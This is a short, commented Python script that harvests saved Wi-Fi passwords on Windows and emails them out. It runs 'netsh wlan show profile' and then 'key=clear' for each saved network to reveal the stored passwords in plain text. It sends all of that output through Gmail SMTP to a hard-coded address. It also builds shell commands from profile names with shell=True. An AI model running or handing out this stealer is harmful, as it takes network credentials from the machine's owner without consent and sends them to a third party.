import subprocess  # Import the subprocess module for running external commands
import smtplib  # Import the smtplib module for sending emails
import re  # Import the re module for regular expressions

# Function to send an email
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)  # Create an SMTP server for Gmail
    server.starttls()  # Start a TLS session for secure communication
    server.login(email, password)  # Log in to the email account
    server.sendmail(email, email, message)  # Send the email to itself (from and to the same address)
    server.quit()  # Quit the SMTP server

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True).decode("utf-8")  # Run a Windows command to list Wi-Fi profiles
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)  # Use regular expressions to extract profile names
network_names_string = ' '.join(network_names_list)  # Join the extracted profile names into a single string

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"  # Get detailed information for each profile
    current_result = subprocess.check_output(command, shell=True).decode("utf-8")  # Run the command and capture the output
    result = str(result) + str(current_result)  # Append the current result to the overall result

send_mail("your@mail", "password", str(result))  # Send the result as an email
